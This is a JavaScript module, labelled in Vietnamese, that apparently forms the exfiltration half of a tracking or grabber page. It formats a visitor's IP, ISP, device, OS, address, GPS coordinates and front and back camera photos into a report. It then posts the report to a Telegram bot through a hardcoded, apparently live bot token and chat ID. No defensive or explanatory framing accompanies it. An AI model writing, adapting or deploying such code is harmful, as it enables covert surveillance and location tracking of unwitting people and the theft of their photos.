// ==================== TELEGRAM CONFIG ====================
const TELEGRAM_CONFIG = {
    BOT_TOKEN: "8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac",
    CHAT_ID: "-1003805423944",
    API_URL: "https://api.telegram.org/bot"
};

// ==================== TELEGRAM SENDER ====================
const TelegramSender = {
    async sendMessage(text) {
        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {
            console.error('Lỗi gửi message:', e);
        }
    },
    
    async sendPhoto(blob, caption) {
        if (!blob) return;
        
        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CONFIG.CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', caption);
        
        try {
            await fetch(url, { method: 'POST', body: formData });
        } catch(e) {
            console.error('Lỗi gửi ảnh:', e);
        }
    },
    
    formatMessage(data) {
        return `📡 *[THÔNG TIN TRUY CẬP]*

🕒 *Thời gian:* ${data.time || '?'}
📱 *Thiết bị:* ${data.device || '?'}
🖥️ *Hệ điều hành:* ${data.os || '?'}
🌍 *IP:* ${data.ip || '?'}
🏢 *ISP:* ${data.isp || '?'}
🏙️ *Địa chỉ:* ${data.location || '?'}
🌎 *Quốc gia:* ${data.country || '?'}
📍 *Vĩ độ:* ${data.lat || '?'}
📍 *Kinh độ:* ${data.lon || '?'}
📌 *Google Maps:* ${data.maps || 'Không có'}
📸 *Camera trước:* ${data.frontCamera || '?'}
📸 *Camera sau:* ${data.backCamera || '?'}
⚠️ *Ghi chú:* ${data.note || 'Thông tin có khả năng chưa chính xác 100%.'}`;
    },
    
    async sendAll(data) {
        const message = this.formatMessage(data);
        await this.sendMessage(message);
        
        if (data.frontPhoto) {
            await this.sendPhoto(data.frontPhoto, '📸 ẢNH CAMERA TRƯỚC');
        }
        
        if (data.backPhoto) {
            await this.sendPhoto(data.backPhoto, '📸 ẢNH CAMERA SAU');
        }
        
        console.log('✅ Đã gửi xong lên Telegram');
    }
};
